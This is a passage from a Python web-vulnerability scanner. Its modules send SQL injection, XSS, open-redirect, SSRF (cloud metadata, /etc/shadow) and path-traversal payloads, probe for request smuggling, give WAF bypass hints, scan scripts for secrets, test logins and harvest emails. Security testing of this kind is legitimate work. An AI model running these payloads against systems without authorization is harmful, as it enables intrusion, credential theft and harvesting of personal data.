    tprint(mod_header(10, "SQL Injection — Error / Boolean / Time-Blind"))
    results = {"vulnerable": []}

    # Extract query params from page links
    status, _, body = http_get(url, timeout=8)
    body_str = body.decode("utf-8", errors="replace") if body else ""

    param_urls = set()
    param_urls.add(url)
    for match in re.finditer(r'href=["\']([^"\']+\?[^"\']+)["\']', body_str):
        link = match.group(1)
        if link.startswith("/"):
            link = state["target_url"].rstrip("/") + link
        elif not link.startswith("http"):
            continue
        param_urls.add(link)

    tested = 0
    for test_url in list(param_urls)[:5]:
        parsed  = urllib.parse.urlparse(test_url)
        params  = urllib.parse.parse_qs(parsed.query)
        if not params:
            continue
        for param, values in params.items():
            for payload, technique in SQL_PAYLOADS:
                new_params = {**{k: v[0] for k, v in params.items()}, param: payload}
                qs   = urllib.parse.urlencode(new_params)
                test = urllib.parse.urlunparse(parsed._replace(query=qs))
                tested += 1

                t0 = time.time()
                st, _, resp_body = http_get(test, timeout=6)
                elapsed = time.time() - t0

                resp_str = (resp_body or b"").decode("utf-8", errors="replace").lower()

                # Time-based detection
                if "time_blind" in technique and elapsed >= 2.8:
                    entry = {"url": test, "param": param, "payload": payload,
                             "technique": technique, "elapsed": elapsed}
                    results["vulnerable"].append(entry)
                    tprint(mod_crit(
                        f"TIME-BLIND SQLi → param={C.BLOOD}{param}{C.RESET} "
                        f"payload={payload!r} elapsed={elapsed:.1f}s"
                    ))
                    continue

                # Error-based detection
                for sig in SQL_ERROR_SIGNATURES:
                    if sig in resp_str:
                        entry = {"url": test, "param": param, "payload": payload,
                                 "technique": "error_based", "evidence": sig}
                        results["vulnerable"].append(entry)
                        tprint(mod_crit(
                            f"ERROR-BASED SQLi → param={C.BLOOD}{param}{C.RESET} "
                            f"payload={payload!r} sig={sig!r}"
                        ))
                        break

    results["tested"] = tested
    if not results["vulnerable"]:
        tprint(mod_ok(f"No SQL injection detected across {tested} test cases."))
    save_finding(module, results)


# ── [11] XSS Probes ──────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

def scan_xss() -> None:
    module = "11_xss"
    url    = state["target_url"]
    tprint(mod_header(11, "XSS Probes — Reflected XSS across common parameters"))
    results = {"vulnerable": [], "tested": 0}

    # Gather parameter-bearing URLs from the target page
    status, _, body = http_get(url, timeout=8)
    body_str = body.decode("utf-8", errors="replace") if body else ""
    param_urls = {url}
    for match in re.finditer(r'href=["\']([^"\']+\?[^"\']+)["\']', body_str):
        link = match.group(1)
        if link.startswith("/"):
            link = state["target_url"].rstrip("/") + link
        elif link.startswith("http"):
            param_urls.add(link)

    common_params = ["q", "s", "search", "query", "id", "page", "name",
                     "value", "msg", "text", "input", "data", "return", "redirect"]

    def test_xss(test_url: str, param: str, payload: str) -> None:
        parsed     = urllib.parse.urlparse(test_url)
        params     = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        qs         = urllib.parse.urlencode(params)
        test       = urllib.parse.urlunparse(parsed._replace(query=qs))
        st, _, resp = http_get(test, timeout=5)
        if resp and payload.encode() in resp:
            entry = {"url": test, "param": param, "payload": payload, "reflected": True}
            with _state_lock:
                results["vulnerable"].append(entry)
            tprint(mod_crit(
                f"REFLECTED XSS → param={C.BLOOD}{param}{C.RESET} "
                f"payload={payload[:40]!r}"
            ))

    tasks = []
    for test_url in list(param_urls)[:3]:
        parsed = urllib.parse.urlparse(test_url)
        existing = list(urllib.parse.parse_qs(parsed.query).keys())
        probe_params = list(set(existing + common_params))[:8]
        for param in probe_params:
            for payload in XSS_PAYLOADS[:5]:
                tasks.append((test_url, param, payload))

    results["tested"] = len(tasks)
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        ex.map(lambda t: test_xss(*t), tasks)

    if not results["vulnerable"]:
        tprint(mod_ok(f"No reflected XSS detected across {len(tasks)} probes."))
    save_finding(module, results)


# ── [12] Open Redirect ────────────────────────────────────────────────────────
REDIRECT_PARAMS  = ["next", "redirect", "redirect_uri", "url", "return", "returnUrl",
                    "return_url", "goto", "dest", "destination", "continue",
                    "redir", "location", "target", "link", "ref"]
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "https:///evil.com",
    "/\\evil.com",
    "%2F%2Fevil.com",
    "https://evil.com%2F@{host}",
    "https://{host}@evil.com",
]

def scan_open_redirect() -> None:
    module = "12_open_redirect"
    url    = state["target_url"]
    host   = state["target_host"]
    tprint(mod_header(12, "Open Redirect — 12 Params + Bypass Payloads"))
    results = {"vulnerable": [], "tested": 0}

    payloads = [p.format(host=host) for p in REDIRECT_PAYLOADS]
    tested   = 0
    parsed   = urllib.parse.urlparse(url)

    for param in REDIRECT_PARAMS:
        for payload in payloads:
            tested += 1
            qs      = urllib.parse.urlencode({param: payload})
            test    = urllib.parse.urlunparse(parsed._replace(query=qs))
            try:
                status, headers, _ = http_get(test, timeout=5, allow_redirects=False)
                location = headers.get("Location", headers.get("location", ""))
                if status in (301, 302, 303, 307, 308) and location:
                    if "evil.com" in location or payload in location:
                        entry = {"param": param, "payload": payload, "location": location}
                        results["vulnerable"].append(entry)
                        tprint(mod_crit(
                            f"OPEN REDIRECT → param={C.BLOOD}{param}{C.RESET} "
                            f"→ {location}"
                        ))
            except Exception:
                pass

    results["tested"] = tested
    if not results["vulnerable"]:
        tprint(mod_ok(f"No open redirect detected across {tested} probes."))
    save_finding(module, results)


# ── [13] Subdomain Enumeration ───────────────────────────────────────────────
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "ns3", "mx",
    "admin", "webmail", "portal", "vpn", "remote", "api", "dev", "stage",
    "staging", "test", "uat", "prod", "app", "apps", "backend", "frontend",
    "static", "cdn", "assets", "media", "img", "images", "upload", "uploads",
    "blog", "shop", "store", "payment", "pay", "billing", "account",
    "auth", "login", "sso", "id", "oauth", "secure", "ssl",
    "dashboard", "panel", "control", "management", "monitor",
    "ci", "jenkins", "gitlab", "github", "git", "jira", "confluence",
    "help", "support", "docs", "documentation", "wiki",
    "internal", "intranet", "corp", "office", "extranet",
    "db", "database", "sql", "mysql", "mongo", "redis", "elastic",
    "beta", "alpha", "preview", "demo", "sandbox", "lab", "labs",
    "mobile", "m", "wap", "api2", "v2", "v3", "old", "legacy",
    "backup", "bak", "archive", "download", "downloads",
]

def probe_subdomain(args: Tuple) -> Optional[Dict]:
    sub, domain = args
    fqdn = f"{sub}.{domain}"
    try:
        if HAS_DNSPYTHON:
            import dns.resolver
            answers = dns.resolver.resolve(fqdn, "A", lifetime=3)
            ips = [r.address for r in answers]
        else:
            ips = [socket.gethostbyname(fqdn)]
        return {"subdomain": fqdn, "ips": ips}
    except Exception:
        return None

def scan_subdomains() -> None:
    module = "13_subdomains"
    host   = state["target_host"]
    # Extract base domain (last 2 parts)
    parts  = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    tprint(mod_header(13, f"Subdomain Enumeration — {len(SUBDOMAIN_WORDLIST)} subdomains → {domain}"))
    results = {"found": [], "domain": domain}

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        args = [(sub, domain) for sub in SUBDOMAIN_WORDLIST]
        for res in ex.map(probe_subdomain, args):
            if res:
                results["found"].append(res)
                tprint(mod_ok(
                    f"{C.CYAN}{res['subdomain']}{C.RESET} → {', '.join(res['ips'])}"
                ))

    tprint(mod_info(f"Discovered {C.BOLD}{len(results['found'])}{C.RESET} subdomains."))
    save_finding(module, results)


# ── [14] DNS & Email Security ─────────────────────────────────────────────────
def dns_query(domain: str, record_type: str) -> List[str]:
    if HAS_DNSPYTHON:
        import dns.resolver
        try:
            return [str(r) for r in dns.resolver.resolve(domain, record_type, lifetime=5)]
        except Exception:
            return []
    try:
        out = subprocess.check_output(
            ["dig", "+short", record_type, domain], timeout=5
        ).decode().strip()
        return [l for l in out.splitlines() if l]
    except Exception:
        return []

def scan_dns_email_security() -> None:
    module = "14_dns_email"
    host   = state["target_host"]
    parts  = host.split(".")
    domain = ".".join(parts[-2:]) if len(parts) >= 2 else host
    tprint(mod_header(14, "DNS & Email Security — SPF / DMARC / MX Records"))
    results = {"spf": None, "dmarc": None, "mx": [], "issues": []}

    # MX Records
    mx_records = dns_query(domain, "MX")
    results["mx"] = mx_records
    if mx_records:
        for mx in mx_records:
            tprint(mod_ok(f"MX: {mx}"))
    else:
        tprint(mod_warn("No MX records found."))
        results["issues"].append("NO_MX_RECORDS")

    # SPF Record
    txt_records = dns_query(domain, "TXT")
    spf = next((r for r in txt_records if "v=spf1" in r.lower()), None)
    if spf:
        tprint(mod_ok(f"SPF: {spf[:100]}"))
        results["spf"] = spf
        if "+all" in spf:
            tprint(mod_crit("SPF has '+all' — allows ANY sender!"))
            results["issues"].append("SPF_PLUS_ALL")
        elif "~all" in spf:
            tprint(mod_warn("SPF uses '~all' (softfail) — consider -all."))
    else:
        tprint(mod_crit("SPF record MISSING — email spoofing risk!"))
        results["issues"].append("NO_SPF")

    # DMARC Record
    dmarc_records = dns_query(f"_dmarc.{domain}", "TXT")
    dmarc = next((r for r in dmarc_records if "v=dmarc1" in r.lower()), None)
    if dmarc:
        tprint(mod_ok(f"DMARC: {dmarc[:100]}"))
        results["dmarc"] = dmarc
        if "p=none" in dmarc.lower():
            tprint(mod_warn("DMARC policy is 'none' — no enforcement."))
            results["issues"].append("DMARC_NONE_POLICY")
    else:
        tprint(mod_crit("DMARC record MISSING — phishing / spoofing risk!"))
        results["issues"].append("NO_DMARC")

    save_finding(module, results)


# ── [15] WAF / CDN Detection ─────────────────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":     ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF / CF":   ["x-amz-cf-id", "x-amz-request-id", "awselb"],
    "Akamai":         ["akamai", "x-akamai-transformed", "x-check-cacheable"],
    "Imperva/Incap":  ["incap_ses", "visid_incap", "x-iinfo", "x-cdn: imperva"],
    "Sucuri":         ["x-sucuri-id", "sucuri"],
    "Fastly CDN":     ["fastly", "x-fastly-request-id", "x-served-by"],
    "F5 BIG-IP":      ["bigipserver", "f5"],
    "ModSecurity":    ["mod_security", "modsec", "x-content-security"],
    "Barracuda":      ["barra_counter_session", "barracuda"],
    "Wordfence":      ["wfwaf-authcookie", "wordfence"],
}

def scan_waf_cdn() -> None:
    module = "15_waf_cdn"
    url    = state["target_url"]
    tprint(mod_header(15, "WAF / CDN Detection — 10 WAF Signatures + Bypass Hints"))
    results = {"detected": [], "bypass_hints": []}

    # Normal request
    status, headers, body = http_get(url, timeout=8)
    h_str   = json.dumps({k.lower(): v.lower() for k, v in headers.items()})

    # Trigger WAF with aggressive payload — build the query string properly so it
    # merges onto the existing path/query instead of appending a stray "/?" segment
    parsed_waf   = urllib.parse.urlparse(url)
    waf_params   = dict(urllib.parse.parse_qsl(parsed_waf.query))
    waf_params["id"]  = "1 UNION SELECT 1,2,3--"
    waf_params["xss"] = "<script>alert(1)</script>"
    waf_trigger_url = urllib.parse.urlunparse(
        parsed_waf._replace(query=urllib.parse.urlencode(waf_params))
    )
    st2, hdrs2, body2 = http_get(waf_trigger_url, timeout=8)
    h_str2  = json.dumps({k.lower(): v.lower() for k, v in hdrs2.items()})
    body2_s = (body2 or b"").decode("utf-8", errors="replace").lower()
    all_str = h_str + " " + h_str2 + " " + body2_s

    for waf_name, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig.lower() in all_str:
                results["detected"].append(waf_name)
                tprint(mod_warn(
                    f"WAF/CDN detected: {C.YELLOW}{waf_name}{C.RESET} "
                    f"(sig: {sig})"
                ))
                # Bypass hints
                if waf_name == "Cloudflare":
                    results["bypass_hints"].append("Try direct IP access; use CF-Connecting-IP header spoofing")
                elif waf_name in ("Imperva/Incap", "Sucuri"):
                    results["bypass_hints"].append("Try HPP (HTTP parameter pollution); chunked encoding bypass")
                else:
                    results["bypass_hints"].append(f"Fuzz {waf_name}: try encoding, case variation, header injection")
                break

    if not results["detected"]:
        tprint(mod_ok("No WAF/CDN signatures detected — may be unprotected."))

    save_finding(module, results)


# ── [16] JS Secret Scanner ────────────────────────────────────────────────────
SECRET_PATTERNS = {
    "AWS Access Key":      r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key":      r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
    "Google API Key":      r"AIza[0-9A-Za-z\-_]{35}",
    "Firebase URL":        r"https://[a-z0-9-]+\.firebaseio\.com",
    "Slack Token":         r"xox[baprs]-[0-9a-zA-Z]{10,48}",
    "Slack Webhook":       r"https://hooks\.slack\.com/services/[A-Z0-9/]+",
    "Stripe Key":          r"sk_live_[0-9a-zA-Z]{24,}",
    "SendGrid Key":        r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}",
    "GitHub Token":        r"ghp_[0-9A-Za-z]{36}",
    "Private Key Block":   r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
    "JWT Token":           r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+",
    "Database URI":        r"(?i)(postgres|mysql|mongodb|redis)://[^\s\"'<>]+",
    "Basic Auth in URL":   r"https?://[a-zA-Z0-9_\-]+:[^@/\s]+@[^\s]+",
    "Generic Password":    r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{6,}['\"]",
    "Generic Secret":      r"(?i)(secret|api_key|api_secret|token|auth)\s*[=:]\s*['\"][^'\"]{8,}['\"]",
}

def scan_js_secrets() -> None:
    module = "16_js_secrets"
    url    = state["target_url"]
    tprint(mod_header(16, "JS Secret Scanner — API Keys / AWS / JWT / DB URIs"))
    results = {"secrets": [], "scripts_checked": 0}

    # Get main page and extract <script src> tags
    status, _, body = http_get(url, timeout=8)
    body_str = body.decode("utf-8", errors="replace") if body else ""
    sources  = set()

    # Inline scripts
    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', body_str, re.DOTALL)
    combined_js    = "\n".join(inline_scripts)

    # External scripts
    for match in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', body_str):
        src = match.group(1)
        if src.startswith("/"):
            src = state["target_url"].rstrip("/") + src
        elif not src.startswith("http"):
            continue
        sources.add(src)

    # Fetch external scripts (up to 10)
    for js_url in list(sources)[:10]:
        st, _, js_body = http_get(js_url, timeout=6)
        if js_body:
            combined_js += "\n" + js_body.decode("utf-8", errors="replace")
            results["scripts_checked"] += 1

    # Also scan the main page body
    combined_js += "\n" + body_str

    # Search for secrets
    for secret_name, pattern in SECRET_PATTERNS.items():
        matches = re.findall(pattern, combined_js)
        for match in set(matches):
            entry = {"type": secret_name, "value": str(match)[:120]}
            results["secrets"].append(entry)
            tprint(mod_crit(
                f"SECRET FOUND — {C.BLOOD}{secret_name}{C.RESET}: "
                f"{C.YELLOW}{str(match)[:80]}{C.RESET}"
            ))

    if not results["secrets"]:
        tprint(mod_ok(f"No secrets found across {results['scripts_checked']+1} scripts."))
    save_finding(module, results)


# ── [17] HTTP Request Smuggling ──────────────────────────────────────────────
def scan_request_smuggling() -> None:
    module = "17_smuggling"
    host   = state["target_host"]
    tprint(mod_header(17, "HTTP Request Smuggling — CL.TE / TE.CL Probes"))
    results = {"findings": []}

    # CL.TE probe: server uses Content-Length, proxy uses Transfer-Encoding
    clte_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    ).encode()

    # TE.CL probe: proxy uses Transfer-Encoding, server uses Content-Length
    tecl_payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "5c\r\n"
        "GPOST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    ).encode()

    for probe_name, payload in [("CL.TE", clte_payload), ("TE.CL", tecl_payload)]:
        for port in [80, 443]:
            try:
                use_ssl = (port == 443)
                t0      = time.time()
                sock    = socket.create_connection((host, port), timeout=8)
                if use_ssl:
                    ctx  = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(payload)
                sock.settimeout(6)
                try:
                    response = b""
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                except socket.timeout:
                    pass
                elapsed = time.time() - t0
                sock.close()
                resp_str = response.decode("utf-8", errors="replace")

                # Indicator: timeout or unexpected error response
                if elapsed >= 5 or ("400 Bad Request" in resp_str and "chunked" not in resp_str.lower()):
                    entry = {"probe": probe_name, "port": port, "elapsed": elapsed, "indicator": "timeout/anomalous"}
                    results["findings"].append(entry)
                    tprint(mod_warn(
                        f"Possible {probe_name} smuggling on port {port} "
                        f"(elapsed={elapsed:.1f}s) — manual verification required."
                    ))
                else:
                    tprint(mod_info(f"{probe_name} probe on port {port} → no anomaly detected."))

            except Exception as e:
                tprint(mod_info(f"{probe_name} port {port}: {e}"))

    if not results["findings"]:
        tprint(mod_ok("No request smuggling indicators found."))
    save_finding(module, results)


# ── [18] Directory Fuzzing ────────────────────────────────────────────────────
DIR_WORDLIST = [
    "admin", "administrator", "login", "wp-admin", "phpmyadmin", "manage",
    "dashboard", "panel", "control", "backend", "server-status", "server-info",
    "api", "api/v1", "api/v2", "graphql", "swagger", "docs", "doc",
    "backup", "backups", "bak", "old", "test", "dev", "staging",
    "config", "configs", "conf", "settings", "setup", "install",
    "uploads", "upload", "files", "images", "img", "media", "assets", "static",
    "tmp", "temp", "log", "logs", "debug",
    ".git", ".svn", ".hg", ".env", ".htaccess",
    "wp-content", "wp-includes", "wordpress",
    "cgi-bin", "scripts", "bin", "exec",
    "secret", "secrets", "private", "hidden",
    "db", "database", "sql", "dump",
    "phpinfo.php", "info.php", "test.php",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    ".well-known/security.txt", ".well-known/acme-challenge",
    "actuator", "actuator/env", "actuator/health", "actuator/info", "actuator/mappings",
    "metrics", "health", "ping", "status",
    "console", "h2-console", "druid/index.html",
    "telescope", "horizon", "queue", "jobs",
    "xmlrpc.php", "wp-cron.php",
    "composer.json", "package.json", "yarn.lock", "Gemfile",
]

def scan_directory_fuzz() -> None:
    module = "18_dir_fuzz"
    base   = state["target_url"]
    tprint(mod_header(18, f"Directory Fuzzing — {len(DIR_WORDLIST)} paths, threaded"))
    results = {"found": []}

    def probe_dir(path: str) -> None:
        url = f"{base.rstrip('/')}/{path.lstrip('/')}"
        status, headers, body = http_get(url, timeout=5)
        if status and status not in (404, 410, 0):
            content_len = len(body) if body else 0
            h = {k.lower(): v for k, v in headers.items()}
            entry = {"path": path, "status": status, "size": content_len}
            with _state_lock:
                results["found"].append(entry)
            color = C.BLOOD if status == 200 else (C.YELLOW if status in (301,302,403) else C.DIM)
            tprint(mod_ok(f"HTTP {color}{status}{C.RESET} → /{path} ({content_len}B)"))

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        list(ex.map(probe_dir, DIR_WORDLIST))

    if not results["found"]:
        tprint(mod_ok("No interesting directories found."))
    save_finding(module, results)


# ── [19] SSRF Probe ──────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",             # AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://100.100.100.200/latest/meta-data/",             # Alibaba metadata
    "http://127.0.0.1/",                                    # localhost
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "file:///etc/passwd",
    "file:///etc/shadow",
    "http://internal.corp/",
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
]
SSRF_PARAMS = ["url", "u", "path", "src", "source", "href", "link", "data",
               "file", "redirect", "fetch", "load", "include", "request", "dest"]

def scan_ssrf() -> None:
    module = "19_ssrf"
    base   = state["target_url"]
    tprint(mod_header(19, "SSRF Probe — AWS/GCP Metadata / Internal IPs / file://"))
    results = {"vulnerable": [], "tested": 0}

    parsed = urllib.parse.urlparse(base)
    tested = 0

    for param in SSRF_PARAMS:
        for payload in SSRF_PAYLOADS[:6]:
            tested += 1
            qs   = urllib.parse.urlencode({param: payload})
            test = urllib.parse.urlunparse(parsed._replace(query=qs))
            try:
                status, headers, body = http_get(test, timeout=6)
                body_str = (body or b"").decode("utf-8", errors="replace")
                # SSRF indicators: metadata content returned
                if any(sig in body_str for sig in [
                    "ami-id", "instance-id", "hostname", "local-ipv4",
                    "root:x:0:0", "computeMetadata", "iam/security-credentials",
                ]):
                    entry = {"param": param, "payload": payload, "evidence": body_str[:200]}
                    results["vulnerable"].append(entry)
                    tprint(mod_crit(
                        f"SSRF CONFIRMED → param={C.BLOOD}{param}{C.RESET} "
                        f"payload={payload}"
                    ))
            except Exception:
                pass

    results["tested"] = tested
    if not results["vulnerable"]:
        tprint(mod_ok(f"No SSRF detected across {tested} probes."))
    save_finding(module, results)


# ── [20] Clickjacking ────────────────────────────────────────────────────────
def scan_clickjacking() -> None:
    module = "20_clickjacking"
    url    = state["target_url"]
    tprint(mod_header(20, "Clickjacking — X-Frame-Options + CSP frame-ancestors"))
    results = {"vulnerable": False, "details": {}}

    status, headers, _ = http_get(url, timeout=8)
    h = {k.lower(): v.lower() for k, v in headers.items()}

    xfo  = h.get("x-frame-options", "")
    csp  = h.get("content-security-policy", "")
    has_frame_ancestors = "frame-ancestors" in csp

    results["details"] = {
        "x-frame-options":    xfo or "MISSING",
        "csp_frame_ancestors": has_frame_ancestors,
    }

    if not xfo and not has_frame_ancestors:
        results["vulnerable"] = True
        tprint(mod_crit(
            "CLICKJACKING RISK — No X-Frame-Options and no CSP frame-ancestors!"
        ))
    elif xfo == "allowall":
        results["vulnerable"] = True
        tprint(mod_crit("X-Frame-Options is 'ALLOWALL' — page can be framed!"))
    else:
        if xfo:
            tprint(mod_ok(f"X-Frame-Options: {xfo}"))
        if has_frame_ancestors:
            tprint(mod_ok("CSP frame-ancestors present."))

    save_finding(module, results)


# ── [21] Auth Checks ─────────────────────────────────────────────────────────
def scan_auth() -> None:
    module = "21_auth"
    url    = state["target_url"]
    host   = state["target_host"]
    tprint(mod_header(21, "Auth Checks — Login Detection / Rate Limiting / Basic Auth"))
    results = {"findings": []}

    status, headers, body = http_get(url, timeout=8)
    h = {k.lower(): v.lower() for k, v in headers.items()}
    body_str = (body or b"").decode("utf-8", errors="replace").lower()

    # WWW-Authenticate Basic Auth
    if "www-authenticate" in h:
        auth_type = h["www-authenticate"]
        tprint(mod_warn(f"WWW-Authenticate header: {auth_type}"))
        results["findings"].append({"type": "basic_auth", "value": auth_type})
        if "basic" in auth_type:
            tprint(mod_crit("Basic Authentication detected — credentials sent in base64!"))

    # Login form detection
    has_login = any(sig in body_str for sig in [
        'type="password"', "type='password'",
        "name=\"password\"", "login", "signin", "sign-in",
    ])
    if has_login:
        tprint(mod_ok("Login form detected — testing rate limiting..."))
        results["findings"].append({"type": "login_form_detected"})

        # Rapid-fire rate limit test (10 fast requests)
        t0 = time.time()
        responses = []
        for i in range(10):
            creds = f"username=admin&password=wrongpassword{i}"
            st, hdrs, _ = http_request(
                url, method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data=creds.encode(),
                timeout=4
            )
            responses.append(st)
        elapsed = time.time() - t0

        successful = [r for r in responses if r is not None]
        if not successful:
            tprint(mod_warn("All 10 login probes failed to connect — target may be unreachable or blocking probes."))
        elif len(set(successful)) == 1 and len(successful) == len(responses) and elapsed < 5:
            tprint(mod_crit(
                "Possible NO RATE LIMITING — 10 login attempts in "
                f"{elapsed:.1f}s with uniform responses!"
            ))
            results["findings"].append({"type": "no_rate_limit", "elapsed": elapsed})
        else:
            tprint(mod_ok(f"Rate limiting appears active (responses: {set(responses)})."))
    else:
        tprint(mod_info("No login form detected on the main page."))

    save_finding(module, results)


# ── [22] ASN & IP Reputation ─────────────────────────────────────────────────
KNOWN_CLOUD_ASNs = {
    "AS14061": "DigitalOcean (common VPS)",
    "AS16509": "Amazon AWS",
    "AS15169": "Google Cloud",
    "AS8075":  "Microsoft Azure",
    "AS13335": "Cloudflare CDN",
    "AS20473": "Vultr",
    "AS63949": "Linode",
    "AS24940": "Hetzner",
    "AS36351": "SoftLayer/IBM",
    "AS16276": "OVHcloud",
    "AS21321": "Contabo",
}

def scan_asn_reputation() -> None:
    module = "22_asn_reputation"
    ip     = state["target_ip"]
    tprint(mod_header(22, f"ASN & IP Reputation — {ip}"))
    results = {"ip": ip, "asn": None, "org": None, "country": None, "vps_flag": False}

    try:
        url = f"https://ipinfo.io/{ip}/json"
        status, _, body = http_get(url, timeout=8)
        if status == 200 and body:
            data = json.loads(body)
            asn     = data.get("org", "")
            country = data.get("country", "")
            city    = data.get("city", "")
            region  = data.get("region", "")
            hostname = data.get("hostname", "")

            results.update({
                "asn":     asn,
                "country": country,
                "city":    city,
                "region":  region,
                "hostname": hostname,
            })

            tprint(mod_info(f"IP       : {ip}"))
            tprint(mod_info(f"ASN/Org  : {C.CYAN}{asn}{C.RESET}"))
            tprint(mod_info(f"Country  : {country} / {city}, {region}"))
            tprint(mod_info(f"Hostname : {hostname}"))

            for asn_id, description in KNOWN_CLOUD_ASNs.items():
                if asn_id in asn:
                    tprint(mod_warn(f"Cloud/VPS provider: {C.YELLOW}{description}{C.RESET}"))
                    results["vps_flag"]    = True
                    results["vps_provider"] = description
                    break
    except Exception as e:
        tprint(mod_err(f"ASN lookup failed: {e}"))
        save_error(module, str(e))

    save_finding(module, results)


# ── [23] Google Dork Generator ───────────────────────────────────────────────
def scan_google_dorks() -> None:
    module = "23_google_dorks"
    host   = state["target_host"]
    tprint(mod_header(23, "Google Dork Generator — 20 Targeted Dorks"))

    dorks = [
        f'site:{host} filetype:pdf',
        f'site:{host} filetype:sql',
        f'site:{host} filetype:log',
        f'site:{host} filetype:bak',
        f'site:{host} filetype:env',
        f'site:{host} inurl:admin',
        f'site:{host} inurl:login',
        f'site:{host} inurl:phpinfo',
        f'site:{host} inurl:wp-admin',
        f'site:{host} inurl:config',
        f'site:{host} inurl:backup',
        f'site:{host} intitle:"index of /"',
        f'site:{host} intitle:"Apache Tomcat"',
        f'site:{host} "index of" "parent directory"',
        f'site:{host} ext:xml | ext:conf | ext:cnf | ext:reg',
        f'site:{host} inurl:"/api/" -inurl:"doc"',
        f'"@{host}" email',
        f'"{host}" password | passwd | credentials',
        f'site:pastebin.com "{host}"',
        f'site:github.com "{host}"',
    ]

    results = {"dorks": dorks}
    for i, dork in enumerate(dorks, 1):
        encoded = urllib.parse.quote(dork)
        tprint(mod_info(
            f"{i:02d}. {C.CYAN}{dork}{C.RESET}\n"
            f"       → https://www.google.com/search?q={encoded}"
        ))

    save_finding(module, results)


# ── [24] Email Harvesting ────────────────────────────────────────────────────
EMAIL_REGEX = re.compile(r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b')

HARVEST_PATHS = ["/", "/contact", "/about", "/team", "/staff",
                 "/support", "/help", "/sitemap.xml", "/humans.txt"]

def scan_email_harvest() -> None:
    module = "24_email_harvest"
    base   = state["target_url"]
    tprint(mod_header(24, "Email Harvesting — Scraping Pages + mailto Links"))
    results = {"emails": []}

    found_emails: set = set()
    for path in HARVEST_PATHS:
        url  = base.rstrip("/") + path
        status, _, body = http_get(url, timeout=6)
        if not body:
            continue
        body_str = body.decode("utf-8", errors="replace")
        for email in EMAIL_REGEX.findall(body_str):
            if email not in found_emails:
                found_emails.add(email)
                results["emails"].append(email)
                tprint(mod_ok(f"Email: {C.CYAN}{email}{C.RESET}"))

    if not found_emails:
        tprint(mod_info("No email addresses found in public pages."))
    else:
        tprint(mod_info(f"Total emails harvested: {C.BOLD}{len(found_emails)}{C.RESET}"))

    save_finding(module, results)


# ── [25] LFI + PHP Filter Chain ──────────────────────────────────────────────
LFI_PARAMS = ["file", "page", "include", "path", "dir", "document", "root",
              "pg", "style", "pdf", "template", "php_path", "doc", "folder",
              "inc", "locate", "show", "site", "type", "view", "content",
              "layout", "mod", "module", "cat", "p", "lang", "language",
              "section", "chapter", "prefix", "suffix", "filename",
              "url", "conf", "detail", "load", "src"]

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "/etc/passwd",
    "....//....//etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "%2F..%2F..%2Fetc%2Fpasswd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
]

def scan_lfi() -> None:
    module = "25_lfi"
    base   = state["target_url"]
    tprint(mod_header(25, "LFI + PHP Filter Chain — 30 Params × 15 Payloads"))
    results = {"vulnerable": [], "tested": 0}

